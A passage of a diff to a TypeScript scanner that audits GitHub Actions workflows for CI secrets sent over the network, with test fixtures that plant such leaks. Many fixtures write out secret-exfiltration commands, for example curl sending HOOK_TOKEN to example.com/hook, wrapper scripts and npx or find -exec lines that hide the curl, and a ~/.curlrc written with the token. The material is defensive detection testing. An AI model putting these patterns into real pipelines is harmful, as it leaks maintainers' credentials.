     if (/^\s*secrets:\s*inherit\b/m.test(step)) secrets.push('secrets: inherit');
     if (usesSecret(step, ctx.names) && secrets.length === 0)
       secrets.push('(a step that uses a secret)');
-    if (secrets.length === 0) continue;
     const local = target.startsWith('./') ? posix.normalize(target) : undefined;
+    const action = local === undefined ? undefined : actionFile(local, ctx.io);
+    const kind = action === undefined ? undefined : actionUsing(action.text);
+    // A local action's own file can give it a secret: an input's default
+    // (${{ github.token }}), or its runs: env or args.
+    if (action && kind !== 'composite') secrets.push(...secretExpressions(action.text, ctx.names));
+    if (secrets.length === 0) continue;
     // A reusable workflow, or a composite action, is read with the workflows.
-    // A JavaScript or Docker action is code the census cannot see.
+    // A JavaScript or Docker action is code the census cannot see: its
+    // directory, and what that imports, is hashed.
     const readable =
       local !== undefined &&
       (censused.has(local) ||
-        ['action.yml', 'action.yaml'].some((name) => {
-          const action = posix.join(local, name);
-          return censused.has(action) && COMPOSITE.test(ctx.io.read(action) ?? '');
-        }));
+        (kind === 'composite' && action !== undefined && censused.has(action.file)));
     if (!readable) {
       ctx.out.unresolved.push({
         where: `${file}:${i + 1}`,
@@ -2404,14 +3148,87 @@ function actionsPassedSecrets(
         why: 'an action passed a secret, which the census cannot read',
         secrets: [...new Set(secrets)].sort(),
         jobSecrets: [...new Set([...jobSecrets(lines, i, ctx.names), ...callers.job])].sort(),
-        runs: {},
+        runs: local === undefined ? {} : actionRuns(local, action?.text ?? null, ctx.io),
+        calls: [],
       });
     }
   }
 }
 
-/** A composite action: its steps are run blocks the census reads. */
-const COMPOSITE = /^\s*using:\s*['"]?composite\b/m;
+/** A local action's action.yml (or action.yaml), when it has one. */
+function actionFile(dir: string, io: Io): { file: string; text: string } | undefined {
+  for (const name of ['action.yml', 'action.yaml']) {
+    const file = posix.join(dir, name);
+    const text = io.read(file);
+    if (text !== null) return { file, text };
+  }
+  return undefined;
+}
+
+/** What an action runs on: `using:` under `runs:` (composite, node20, docker), not any line. */
+function actionUsing(text: string): string | undefined {
+  const lines = text.split('\n');
+  const at = lines.findIndex((line) => /^runs:/.test(line));
+  if (at === -1) return undefined;
+  const flow = /^runs:\s*\{(.*)\}\s*(?:#.*)?$/.exec(lines[at] ?? '')?.[1];
+  if (flow !== undefined) return /(?:^|,)\s*using\s*:\s*['"]?([\w.-]+)/.exec(flow)?.[1];
+  const body = lines.slice(at + 1, blockEnd(lines, at, 0)).filter(meaningful);
+  const column = Math.min(...body.map(indentOf));
+  for (const line of body) {
+    const m = /^\s*using:\s*['"]?([\w.-]+)/.exec(line);
+    if (m && indentOf(line) === column) return m[1];
+  }
+  return undefined;
+}
+
+/**
+ * The files of a local action, each with a hash of its text: every file in
+ * its directory (to the depth limit, 8 directories down), what runs.main,
+ * pre, post or image name outside it, and what they import from the
+ * repository.
+ */
+function actionRuns(dir: string, text: string | null, io: Io): Record<string, string> {
+  const files: string[] = [];
+  const visit = (at: string, level: number) => {
+    for (const name of io.files(at)) files.push(posix.join(at, name));
+    if (level < MAX_DEPTH) for (const name of io.dirs(at)) visit(posix.join(at, name), level + 1);
+  };
+  visit(dir, 0);
+  for (const m of (text ?? '').matchAll(/^\s*(?:main|pre|post|image)\s*:\s*['"]?([^'"\s#]+)/gm)) {
+    const file = posix.join(dir, m[1] ?? '');
+    if (io.read(file) !== null) files.push(file);
+  }
+  return hashed(files, io);
+}
+
+/**
+ * An env: that sets PATH, HOME, CURL_HOME or XDG_CONFIG_HOME is unresolved,
+ * as the same assignment in a script is (lookupChanges).
+ */
+function lookupEnvChanges(file: string, lines: string[], ctx: Ctx): void {
+  for (const [i, line] of lines.entries()) {
+    const m = /^(\s*)(-\s+)?env:[ \t]*(.*)$/.exec(line);
+    if (!m) continue;
+    const end = blockEnd(lines, i, keyColumn(line));
+    const body = [m[3] ?? '', ...lines.slice(i + 1, end)];
+    for (const [j, text] of body.entries()) {
+      for (const key of text.matchAll(/(?:^|[{,])\s*['"]?([A-Za-z_]\w*)['"]?\s*:/g)) {
+        const name = key[1] ?? '';
+        if (!LOOKUP_VARIABLES.has(name)) continue;
+        ctx.out.unresolved.push({
+          where: `${file}:${i + j + 1}`,
+          file,
+          command: text.trim(),
+          why: `an env: that sets ${name}, ${LOOKUP_VARIABLES.get(name)}`,
+          secrets: [],
+          jobSecrets: jobSecrets(lines, i, ctx.names),
+          runs: {},
+          calls: [],
+        });
+      }
+    }
+  }
+}
 
 /** Every local action a workflow uses, as `uses: ./path`, that is a composite one. */
 function localActions(
@@ -2423,13 +3240,9 @@ function localActions(
     for (const m of (found[i]?.text ?? '').matchAll(
       /^\s*(?:-\s+)?uses:\s*['"]?(\.\/[^\s'"@]+)/gm,
     )) {
-      const dir = posix.normalize(m[1] ?? '');
-      for (const name of ['action.yml', 'action.yaml']) {
-        const file = posix.join(dir, name);
-        const text = io.read(file);
-        if (text === null || found.some((entry) => entry.file === file)) continue;
-        if (COMPOSITE.test(text)) found.push({ file, text });
-      }
+      const action = actionFile(posix.normalize(m[1] ?? ''), io);
+      if (action === undefined || found.some((entry) => entry.file === action.file)) continue;
+      if (actionUsing(action.text) === 'composite') found.push(action);
     }
   }
   return found;
@@ -2469,13 +3282,20 @@ function census(workflows: Array<{ file: string; text: string }>, io: Io): Censu
       const callers = /(?:^|\/)action\.ya?ml$/.test(file) ? every : { env: [], job: [] };
       for (const block of runBlocks(text)) {
         const src = fileSource(file, block.line);
-        const env = [...envSecrets(lines, block.index, names), ...callers.env];
+        // The step's env: (and its job's and workflow's), and every secret its
+        // own script pastes in: X=${{ secrets.X }} cmd puts one in cmd's environment.
+        const env = [
+          ...envSecrets(lines, block.index, names),
+          ...callers.env,
+          ...secretExpressions(block.script, names),
+        ];
         ctx.env = [...new Set(env)].sort();
         const job = [...jobSecrets(lines, block.index, names), ...callers.job];
         ctx.jobSecrets = [...new Set(job)].sort();
         if (block.alias) {
           cannotRead(
             ctx,
+            undefined,
             src,
             `${file}:${block.line}`,
             `run: ${block.alias}`,
@@ -2484,23 +3304,19 @@ function census(workflows: Array<{ file: string; text: string }>, io: Io): Censu
         } else if (block.foreignShell) {
           cannotRead(
             ctx,
+            undefined,
             src,
             src.where(1),
             `shell: ${block.foreignShell}`,
             'a run block in a shell the census cannot read',
           );
         } else {
-          const shell: Shell = { functions: new Map(), reread: new Set() };
-          walk(
-            block.script,
-            src,
-            { secretVars: new Set(names), cwd: block.cwd, depth: 0, shell },
-            ctx,
-          );
+          walk(block.script, src, blockScope(names, block.cwd), ctx);
         }
       }
       ctx.env = [];
       ctx.jobSecrets = [];
+      lookupEnvChanges(file, lines, ctx);
       actionsPassedSecrets(file, text, ctx, censused, callers);
     }
     if (names.size === before) return merged(ctx.out, ctx.written);
@@ -2532,11 +3348,13 @@ function merged(out: Census, written: ReadonlySet<string>): Census {
     const seen = unresolved.get(key);
     const secrets = [...(seen?.secrets ?? []), ...entry.secrets, ...written];
     const job = [...(seen?.jobSecrets ?? []), ...entry.jobSecrets];
+    const calls = [...(seen?.calls ?? []), ...entry.calls];
     unresolved.set(key, {
       ...entry,
       secrets: [...new Set(secrets)].sort(),
       jobSecrets: [...new Set(job)].sort(),
       runs: { ...seen?.runs, ...entry.runs },
+      calls: [...new Set(calls)].sort(),
     });
   }
   return { curls: [...curls.values()], scripts: out.scripts, unresolved: [...unresolved.values()] };
@@ -2546,6 +3364,8 @@ const repoIo: Io = {
   read(path) {
     const abs = resolve(REPO_ROOT, path);
     if (!abs.startsWith(REPO_ROOT + sep)) return null;
+    // Installed packages are not the repository: what they run, a step installed.
+    if (abs.slice(REPO_ROOT.length).split(sep).includes('node_modules')) return null;
     return existsSync(abs) && statSync(abs).isFile() ? readFileSync(abs, 'utf8') : null;
   },
   dirs(path) {
@@ -2602,12 +3422,14 @@ interface ReadByHand {
   jobSecrets: string[];
   /** Its Unresolved.runs when it was read: each file it runs, by the hash of the text read. */
   runs: Record<string, string>;
+  /** Its Unresolved.calls when it was read; none when left out. */
+  calls?: string[];
 }
 
 /**
  * What the census could not read, less what READ_BY_HAND has read as it
- * stands: an entry whose secrets, job or files are not what was read is open
- * again, and says what changed.
+ * stands: an entry whose secrets, job, files or calls are not what was read
+ * is open again, and says what changed.
  */
 function openItems(result: Census, read: Readonly<Record<string, ReadByHand>> = {}): string[] {
   const open: string[] = [];
@@ -2640,6 +3462,9 @@ function changedSince(hand: ReadByHand, now: Unresolved): string[] {
     else if (then === undefined) changed.push(`it runs ${file} (${text}), which was not read`);
     else changed.push(`${file} changed since it was read (read at ${then}, now ${text})`);
   }
+  if (list(hand.calls ?? []) !== list(now.calls)) {
+    changed.push(`it is called as ${list(now.calls)}, read as ${list(hand.calls ?? [])}`);
+  }
   return changed;
 }
 
@@ -2662,6 +3487,13 @@ const READ_BY_HAND: Readonly<Record<string, ReadByHand>> = {
       jobSecrets: [],
       runs: { 'scripts/dependency-audit/report.mjs': 'e54994a3609c4426' },
     },
+  '.github/workflows/smoke-sim.yml: curl -fsSL "$BUILD_URL" -o /tmp/stockpilot-sim.tar.gz': {
+    reason:
+      'Downloads the simulator build from the artifact URL that the EAS build step wrote to /tmp/eas-build.json (read with jq in the line before). The answer, a .tar.gz, goes to /tmp/stockpilot-sim.tar.gz, which the next lines extract and never print; with -f a failure prints only the status. The step maps no secret, and EXPO_TOKEN is in the EAS build step alone.',
+    secrets: [],
+    jobSecrets: ['${{ secrets.EXPO_TOKEN }}', '${{ secrets.STOCKPILOT_SMOKE_PASSWORD }}'],
+    runs: {},
+  },
   '.github/workflows/smoke-sim.yml: python3 scripts/smoke/smoke.py --ci --udid "$SMOKE_UDID"': {
     reason:
       'Drives the simulator with idb and xcrun simctl and prints each flow and its result. It makes no request itself and reads no file; STOCKPILOT_SMOKE_PASSWORD only goes through the simulator pasteboard into the sign-in field and is never printed. EXPO_TOKEN is in the EAS build step alone.',
@@ -2678,10 +3510,15 @@ const READ_BY_HAND: Readonly<Record<string, ReadByHand>> = {
   },
   'scripts/security-test.sh: vitest run "$@"': {
     reason:
-      "run_vitest runs the security suites that scripts/security-test.sh lists, in the web app, the phone app and the shared core (pnpm security:test, in CI's DB pgTAP tests job). No step of that job maps or uses a secret, so no suite has one to send.",
+      'run_vitest runs the security suites that scripts/security-test.sh lists, in the web app, the phone app and the shared core (pnpm security:test, in CI\'s DB pgTAP tests job): it is called once per package with that package\'s list, and "$@" is the list. No step of that job maps or uses a secret, so no suite has one to send.',
     secrets: [],
     jobSecrets: [],
     runs: {},
+    calls: [
+      'run_vitest "Mobile client" "@stockpilot/mobile" "${MOBILE_TESTS[@]}"',
+      'run_vitest "Shared core" "@stockpilot/core" "${CORE_TESTS[@]}"',
+      'run_vitest "Web application" "@stockpilot/web" "${WEB_TESTS[@]}"',
+    ],
   },
   'apps/web/package.json scripts["build"]: node ./scripts/copy-maplibre-worker.mjs': {
     reason: 'Copies two maplibre-gl files from node_modules into public/. It makes no request.',
@@ -2786,8 +3623,31 @@ interface Plant {
   finds: { violation: RegExp } | { unresolved: RegExp } | { nothing: true };
 }
 
-const NOTIFY_SCRIPT =
-  '#!/usr/bin/env bash\ncurl -fsS -H "X-Hook: ${HOOK_TOKEN}" https://example.com/hook\n';
+/** A curl that sends HOOK_TOKEN and prints the answer. */
+const HOOK_CURL = 'curl -fsS -H "X-Hook: ${HOOK_TOKEN}" https://example.com/hook';
+const NOTIFY_SCRIPT = `#!/usr/bin/env bash\n${HOOK_CURL}\n`;
+
+/** A repository wrapper that runs `program` with the arguments it was given. */
+const shellWrapper = (program: string) => `#!/usr/bin/env bash\nexec ${program} "$@"\n`;
+const nodeWrapper = (program: string) =>
+  `#!/usr/bin/env node\nrequire('node:child_process').execFileSync('${program}', process.argv.slice(2), { stdio: 'inherit' });\n`;
+
+/** A job whose env: maps HOOK_TOKEN from a secret, and whose steps run these, in order. */
+function hookJob(...runs: string[]): string {
+  return [
+    'on: push',
+    'jobs:',
+    '  plant:',
+    '    runs-on: ubuntu-latest',
+    '    env:',
+    '      HOOK_TOKEN: ${{ secrets.HOOK_TOKEN }}',
+    '    steps:',
+    ...runs.map((script) => `      - run: ${script}`),
+  ].join('\n');
+}
+
+/** The step that puts the workspace on PATH for the steps after it. */
+const WORKSPACE_ON_PATH = 'echo "$GITHUB_WORKSPACE" >> "$GITHUB_PATH"';
 
 /** A repository program, not a shell script, that sends HOOK_TOKEN and prints the answer. */
 const HOOK_PROGRAM = [
@@ -2801,6 +3661,31 @@ const REPORT_ENV = { REPORT_TOKEN: '${{ secrets.REPORT_TOKEN }}' };
 const HOOK_URL_ENV = { REPORT_HOOK: '${{ secrets.REPORT_HOOK_URL }}' };
 /** A helper file whose function sends its first argument. */
 const LIB_SCRIPT = '#!/usr/bin/env bash\n\npost_report() { curl -fsS -X POST "$1"; }\n';
+
+/** A local JavaScript action's action.yml, run with node from index.js. */
+const JS_ACTION = [
+  'name: Report',
+  'inputs:',
+  '  token:',
+  '    required: true',
+  'runs:',
+  "  using: 'node20'",
+  '  main: index.js',
+].join('\n');
+/** A local Docker action: its action.yml, and the Dockerfile that runs entrypoint.sh. */
+const DOCKER_ACTION = {
+  '.github/actions/report/action.yml': [
+    'name: Report',
+    'inputs:',
+    '  token:',
+    '    required: true',
+    'runs:',
+    "  using: 'docker'",
+    "  image: 'Dockerfile'",
+  ].join('\n'),
+  '.github/actions/report/Dockerfile':
+    'FROM alpine:3\nCOPY entrypoint.sh /entrypoint.sh\nENTRYPOINT ["/entrypoint.sh"]\n',
+};
 
 /** A one-step workflow that passes a secret to the local action at `path`. */
 function actionWorkflow(path: string): string {
@@ -3953,6 +4838,573 @@ const PLANTS: Plant[] = [
     files: { psql: '#!/usr/bin/env bash\necho "psql is not installed here"\n' },
     finds: { unresolved: /psql "\$DATABASE_URL" .*\(a client that prints what a server answers/ },
   },
+  // (10) Review of 1875b129c: a file named like a program the census follows
+  // and run by its path (./bin/pnpm, tools/bash) was read as a file, and
+  // what its arguments run was not (the guard of e43f2c33a went by its name
+  // and found H1 to H4 and H6 to H14); a bare name beside a repository file
+  // of that name was read only for a client; an expansion that names a
+  // script, task, package or command was dropped; and what the census
+  // cannot see in curl, actions, functions, runners, PATH and clients.
+  {
+    id: 'H1',
+    what: './bin/pnpm run deploy, bin/pnpm a node wrapper, package.json deploy curls the secret',
+    script: './bin/pnpm run deploy',
+    env: HOOK_ENV,
+    files: {
+      'bin/pnpm': nodeWrapper('pnpm'),
+      'package.json': JSON.stringify({ scripts: { deploy: HOOK_CURL } }),
+    },
+    finds: { violation: /^package\.json scripts\["deploy"\]: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H2',
+    what: './bin/pnpm run deploy, bin/pnpm a shell wrapper (exec pnpm "$@")',
+    script: './bin/pnpm run deploy',
+    env: HOOK_ENV,
+    files: {
+      'bin/pnpm': shellWrapper('pnpm'),
+      'package.json': JSON.stringify({ scripts: { deploy: HOOK_CURL } }),
+    },
+    finds: { violation: /^package\.json scripts\["deploy"\]: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H3',
+    what: 'tools/bash -c "curl -d $TOKEN ...", tools/bash a node wrapper',
+    script: 'tools/bash -c "curl -d $TOKEN https://example.test"',
+    env: { TOKEN: '${{ secrets.TOKEN }}' },
+    files: { 'tools/bash': nodeWrapper('bash') },
+    finds: { violation: /^plant\.yml:10: curl -d \$TOKEN https:\/\/example\.test/ },
+  },
+  {
+    id: 'H4',
+    what: 'tools/bash -c "curl -d $TOKEN ...", tools/bash a shell wrapper (exec bash "$@")',
+    script: 'tools/bash -c "curl -d $TOKEN https://example.test"',
+    env: { TOKEN: '${{ secrets.TOKEN }}' },
+    files: { 'tools/bash': '#!/bin/sh\nexec bash "$@"\n' },
+    finds: { violation: /^plant\.yml:10: curl -d \$TOKEN https:\/\/example\.test/ },
+  },
+  {
+    id: 'H5',
+    what: 'bare make deploy beside a repository file make that curls the secret, the workspace on PATH',
+    workflow: hookJob(WORKSPACE_ON_PATH, 'make deploy'),
+    files: { make: NOTIFY_SCRIPT },
+    finds: { violation: /^make:2: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H6',
+    what: 'node_modules/.bin/turbo run notify: a program an earlier step made goes by its name',
+    script: 'node_modules/.bin/turbo run notify',
+    env: HOOK_ENV,
+    files: plantWorkspace(HOOK_CURL),
+    finds: { violation: /^apps\/web\/package\.json scripts\["notify"\]: curl/ },
+  },
+  {
+    id: 'H7',
+    what: "node_modules/.bin/npx -c '<curl>'",
+    script: `node_modules/.bin/npx -c '${HOOK_CURL}'`,
+    env: HOOK_ENV,
+    finds: { violation: /^plant\.yml:10: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H8',
+    what: './node_modules/.bin/pnpm run deploy: not in the repository, so it goes by its name',
+    script: './node_modules/.bin/pnpm run deploy',
+    env: HOOK_ENV,
+    files: { 'package.json': JSON.stringify({ scripts: { deploy: HOOK_CURL } }) },
+    finds: { violation: /^package\.json scripts\["deploy"\]: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H9',
+    what: './bin/find . -name x -exec <curl> \\; (bin/find a shell wrapper)',
+    script: `./bin/find . -name x -exec ${HOOK_CURL} \\;`,
+    env: HOOK_ENV,
+    files: { 'bin/find': shellWrapper('find') },
+    finds: { violation: /^plant\.yml:10: \.\/bin\/find \. -name x -exec curl/ },
+  },
+  {
+    id: 'H10',
+    what: './bin/npm run deploy (exec npm "$@")',
+    script: './bin/npm run deploy',
+    env: HOOK_ENV,
+    files: {
+      'bin/npm': shellWrapper('npm'),
+      'package.json': JSON.stringify({ scripts: { deploy: HOOK_CURL } }),
+    },
+    finds: { violation: /^package\.json scripts\["deploy"\]: curl/ },
+  },
+  {
+    id: 'H11',
+    what: './bin/npm test, the wrapper running npm run "$@"',
+    script: './bin/npm test',
+    env: HOOK_ENV,
+    files: {
+      'bin/npm': '#!/usr/bin/env bash\nnpm run "$@"\n',
+      'package.json': JSON.stringify({ scripts: { test: HOOK_CURL } }),
+    },
+    finds: { violation: /^package\.json scripts\["test"\]: curl/ },
+  },
+  {
+    id: 'H12',
+    what: './bin/npx -c \'<curl>\' (exec npx "$@")',
+    script: `./bin/npx -c '${HOOK_CURL}'`,
+    env: HOOK_ENV,
+    files: { 'bin/npx': shellWrapper('npx') },
+    finds: { violation: /^plant\.yml:10: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H13',
+    what: './bin/bunx sh -c \'<curl>\' (exec bunx "$@")',
+    script: `./bin/bunx sh -c '${HOOK_CURL}'`,
+    env: HOOK_ENV,
+    files: { 'bin/bunx': shellWrapper('bunx') },
+    finds: { violation: /^plant\.yml:10: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H14',
+    what: './bin/turbo run notify (exec turbo "$@")',
+    script: './bin/turbo run notify',
+    env: HOOK_ENV,
+    files: { ...plantWorkspace(HOOK_CURL), 'bin/turbo': shellWrapper('turbo') },
+    finds: { violation: /^apps\/web\/package\.json scripts\["notify"\]: curl/ },
+  },
+  {
+    id: 'H15',
+    what: './bin/yarn run deploy (exec yarn "$@")',
+    script: './bin/yarn run deploy',
+    env: HOOK_ENV,
+    files: {
+      'bin/yarn': shellWrapper('yarn'),
+      'package.json': JSON.stringify({ scripts: { deploy: HOOK_CURL } }),
+    },
+    finds: { violation: /^package\.json scripts\["deploy"\]: curl/ },
+  },
+  {
+    id: 'H16',
+    what: './bin/env curl ...: a wrapper by its relative path runs the command after its options',
+    script: `./bin/env curl -fsS ${AUTH} ${API}`,
+    env: HOOK_ENV,
+    files: { 'bin/env': nodeWrapper('env') },
+    finds: { violation: /^plant\.yml:10: \.\/bin\/env curl -fsS -H "Authorization/ },
+  },
+  {
+    id: 'H17',
+    what: 'npm run "$SCRIPT": a script named by an expansion',
+    script: 'npm run "$SCRIPT"',
+    env: HOOK_ENV,
+    files: { 'package.json': JSON.stringify({ scripts: { deploy: HOOK_CURL } }) },
+    finds: { unresolved: /npm run "\$SCRIPT" \(a npm script named by an expansion/ },
+  },
+  {
+    id: 'H18',
+    what: 'scripts/turbo.sh run notify, the script running turbo "$@"',
+    script: 'scripts/turbo.sh run notify',
+    env: HOOK_ENV,
+    files: { ...plantWorkspace(HOOK_CURL), 'scripts/turbo.sh': shellWrapper('turbo') },
+    finds: {
+      unresolved:
+        /^scripts\/turbo\.sh:2: turbo "\$@" \(a turbo task or option named by an expansion/,
+    },
+  },
+  {
+    id: 'H19',
+    what: 'npx "$@" in a script: a package named by an expansion ("$@" is no version)',
+    script: 'bash scripts/tool.sh prettier --check .',
+    env: HOOK_ENV,
+    files: { 'scripts/tool.sh': '#!/usr/bin/env bash\nnpx "$@"\n' },
+    finds: {
+      unresolved:
+        /^scripts\/tool\.sh:2: npx "\$@" \(npx of a package or command named by an expansion/,
+    },
+  },
+  {
+    id: 'H20',
+    what: 'find "$@": words that may hold -exec',
+    script: 'find "$@"',
+    env: HOOK_ENV,
+    finds: { unresolved: /plant\.yml:10: find "\$@" \(find with words the census cannot see/ },
+  },
+  {
+    id: 'H21',
+    what: 'bare pnpm run deploy beside a repository file pnpm, the workspace on PATH',
+    workflow: hookJob(WORKSPACE_ON_PATH, 'pnpm run deploy'),
+    files: {
+      pnpm: NOTIFY_SCRIPT,
+      'package.json': JSON.stringify({ scripts: { deploy: 'echo deploy' } }),
+    },
+    finds: { violation: /^pnpm:2: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H22',
+    what: "bare bash -c 'echo hi' beside a repository file bash, the workspace on PATH",
+    workflow: hookJob(WORKSPACE_ON_PATH, "bash -c 'echo hi'"),
+    files: { bash: NOTIFY_SCRIPT },
+    finds: { violation: /^bash:2: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H23',
+    what: 'bare turbo run lint beside a repository file turbo, the workspace on PATH',
+    workflow: hookJob(WORKSPACE_ON_PATH, 'turbo run lint'),
+    files: { ...plantWorkspace('echo lint'), turbo: NOTIFY_SCRIPT },
+    finds: { violation: /^turbo:2: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H24',
+    what: 'bare npx prettier --check . beside a repository file npx, the workspace on PATH',
+    workflow: hookJob(WORKSPACE_ON_PATH, 'npx prettier --check .'),
+    files: { npx: NOTIFY_SCRIPT },
+    finds: { violation: /^npx:2: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H25',
+    what: 'bare curl beside a repository file curl, the workspace on PATH',
+    workflow: hookJob(WORKSPACE_ON_PATH, 'curl -fsS -o /dev/null https://example.com/health'),
+    files: { curl: NOTIFY_SCRIPT },
+    finds: { violation: /^curl:2: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H26',
+    what: 'bare vitest run beside a repository file vitest, the workspace on PATH',
+    workflow: hookJob(WORKSPACE_ON_PATH, 'vitest run'),
+    files: { vitest: NOTIFY_SCRIPT },
+    finds: { violation: /^vitest:2: curl -fsS -H "X-Hook/ },
+  },
+  {
+    id: 'H27',
+    what: 'pnpm run notify -- <args>: the words after the name are added to the script',
+    script: 'pnpm run notify -- -H "X-Hook: $HOOK_TOKEN"',
+    env: HOOK_ENV,
+    files: {
+      'package.json': JSON.stringify({ scripts: { notify: 'curl -fsS https://example.com/hook' } }),
+    },
+    finds: {
+      violation:
+        /^package\.json scripts\["notify"\]: curl -fsS https:\/\/example\.com\/hook -H "X-Hook/,
+    },
+  },
+  // Gap A: what curl sends from a command's output or a file the shell reads,
+  // and the config file curl reads by itself.
+  {
+    id: 'H28',
+    what: '--data "token=$(cat token.txt)": a value from a command',
+    script: `printf '%s' "$REPORT_TOKEN" > token.txt\ncurl -fsS --data "token=$(cat token.txt)" ${API}`,
+    env: REPORT_ENV,
+    finds: {
+      unresolved:
+        /curl -fsS --data "token=\$\(cat token\.txt\)" .*\(it sends what a command printed or a file held/,
+    },
+  },
+  {
+    id: 'H29',
+    what: '-H "X-Report-Key: $(cat token.txt)" and --data-urlencode "token=$(< token.txt)"',
+    script: `curl -fsS -H "X-Report-Key: $(cat token.txt)" --data-urlencode "token=$(< token.txt)" ${API}`,
+    finds: {
+      unresolved:
+        /\(it sends what a command printed or a file held \("X-Report-Key: \$\(cat token\.txt\)" "token=\$\(< token\.txt\)"\)/,
+    },
+  },
+  {
+    id: 'H30',
+    what: 'VALUE="$(cat token.txt)", then -H "X-Report-Key: $VALUE"',
+    script: `VALUE="$(cat token.txt)"\ncurl -fsS -H "X-Report-Key: $VALUE" ${API}`,
+    finds: {
+      unresolved:
+        /curl -fsS -H "X-Report-Key: \$VALUE" .*\(it sends what a command printed or a file held/,
+    },
+  },
+  {
+    id: 'H31',
+    what: 'read -r VALUE < token.txt, then -H "X-Report-Key: $VALUE"',
+    script: `read -r VALUE < token.txt\ncurl -fsS -H "X-Report-Key: $VALUE" ${API}`,
+    finds: {
+      unresolved:
+        /curl -fsS -H "X-Report-Key: \$VALUE" .*\(it sends what a command printed or a file held/,
+    },
+  },
+  {
+    id: 'H32',
+    what: 'a script given what a command printed sends it as $1',
+    script: 'bash scripts/post.sh "$(cat token.txt)"',
+    files: { 'scripts/post.sh': `#!/usr/bin/env bash\ncurl -fsS -H "X-Report-Key: $1" ${API}\n` },
+    finds: {
+      unresolved:
+        /^scripts\/post\.sh:2: curl -fsS -H "X-Report-Key: \$1" .*\(it sends what a command printed/,
+    },
+  },
+  {
+    id: 'H33',
+    what: 'control: a value from a command in a curl that discards its answer, or in where it writes',
+    script: [
+      `curl -fsS -o /dev/null -H "X-Request-Id: $(uuidgen)" ${API}`,
+      'curl -fsS -o "$(mktemp)" https://example.com/tool.tar.gz',
+    ].join('\n'),
+    finds: { nothing: true },
+  },
+  {
+    id: 'H34',
+    what: '~/.curlrc written from the secret, then a bare curl reads it by itself',
+    script: `printf 'header = "Authorization: Bearer %s"\\n' "$HOOK_TOKEN" > ~/.curlrc\ncurl -fsS ${API}`,
+    env: HOOK_ENV,
+    finds: {
+      unresolved: /> ~\/\.curlrc \(it names a curl config file, which every curl reads by itself/,
+    },
+  },
+  {
+    id: 'H35',
+    what: 'CURL_HOME and XDG_CONFIG_HOME set: curl reads a config file there',
+    script: `export CURL_HOME="$PWD/ci"\nXDG_CONFIG_HOME="$PWD/ci" curl -fsS -o /dev/null ${API}`,
+    finds: { unresolved: /XDG_CONFIG_HOME="\$PWD\/ci" curl .*\(it sets XDG_CONFIG_HOME/ },
+  },
+  // Gap B: a local action that gets github.token from its own input default,
+  // and an action.yml whose description says composite.
+  {
+    id: 'H36',
+    what: "a local JavaScript action whose input's default is github.token, passed nothing",
+    workflow: [
+      'on: push',
+      'jobs:',
+      '  plant:',
+      '    runs-on: ubuntu-latest',
+      '    steps:',
+      '      - uses: ./.github/actions/report',
+    ].join('\n'),
+    files: {
+      '.github/actions/report/action.yml': [
+        'name: Report',
+        'inputs:',
+        '  token:',
+        '    default: ${{ github.token }}',
+        'runs:',
+        "  using: 'node20'",
+        '  main: index.js',
+      ].join('\n'),
+      '.github/actions/report/index.js': HOOK_PROGRAM,
+    },
+    finds: { unresolved: /uses: \.\/\.github\/actions\/report \(an action passed a secret/ },
+  },
+  {
+    id: 'H37',
+    what: 'a JavaScript action whose description has a line "using: composite"',
+    workflow: actionWorkflow('./.github/actions/report'),
+    files: {
+      '.github/actions/report/action.yml': [
+        'name: Report',
+        'description: |',
+        '  Posts the report.',
+        '  using: composite',
+        'inputs:',
+        '  token:',
+        '    required: true',
+        'runs:',
+        "  using: 'node20'",
+        '  main: index.js',
+      ].join('\n'),
+    },
+    finds: { unresolved: /uses: \.\/\.github\/actions\/report \(an action passed a secret/ },
+  },
+  // Gap C: a function that sends a global assigned from a secret after the
+  // function was defined.
+  {
+    id: 'H38',
+    what: 'a sourced function, then PAYLOAD assigned from the secret, then the call',
+    script: 'source scripts/lib.sh\nPAYLOAD="$HOOK_TOKEN"\npost',
+    env: HOOK_ENV,
+    files: {
+      'scripts/lib.sh': `#!/usr/bin/env bash\npost() { curl -fsS -H "X-Report-Key: $PAYLOAD" ${API}; }\n`,
+    },
+    finds: { violation: /^scripts\/lib\.sh:2: \{ curl -fsS -H "X-Report-Key: \$PAYLOAD"/ },
+  },
+  {
+    id: 'H39',
+    what: "the run block's own function, then PAYLOAD assigned from the secret, then the call",
+    script: `post() { curl -fsS -H "X-Report-Key: $PAYLOAD" ${API}; }\nPAYLOAD="$HOOK_TOKEN"\npost`,
+    env: HOOK_ENV,
+    finds: { violation: /^plant\.yml:10: \{ curl -fsS -H "X-Report-Key: \$PAYLOAD"/ },
+  },
+  {
+    id: 'H40',
+    what: 'a variable a sourced file assigns from the secret, sent by the caller',
+    script: `source scripts/env.sh\ncurl -fsS -H "X-Report-Key: $PAYLOAD" ${API}`,
+    env: HOOK_ENV,
+    files: { 'scripts/env.sh': '#!/usr/bin/env bash\nPAYLOAD="$HOOK_TOKEN"\n' },
+    finds: { violation: /^plant\.yml:11: curl -fsS -H "X-Report-Key: \$PAYLOAD"/ },
+  },
+  {
+    id: 'H41',
+    what: 'a for loop over the secret',
+    script: `for value in "$HOOK_TOKEN"; do curl -fsS -H "X-Report-Key: $value" ${API}; done`,
+    env: HOOK_ENV,
+    finds: { violation: /^plant\.yml:10: do curl -fsS -H "X-Report-Key: \$value"/ },
+  },
+  {
+    id: 'H42',
+    what: 'printf -v HEADER from the secret',
+    script: [
+      `printf -v HEADER 'X-Report-Key: %s' "$HOOK_TOKEN"`,
+      `curl -fsS -H "$HEADER" -o /dev/null -o /dev/null ${API} ${API}`,
+      `curl -fsS -H "$HEADER" ${API}`,
+    ].join('\n'),
+    env: HOOK_ENV,
+    finds: { violation: /^plant\.yml:12: curl -fsS -H "\$HEADER" https/ },
+  },
+  // Gap D: load-test runners, the test and run subcommands of toolchains,
+  // and the test runners of other languages.
+  {
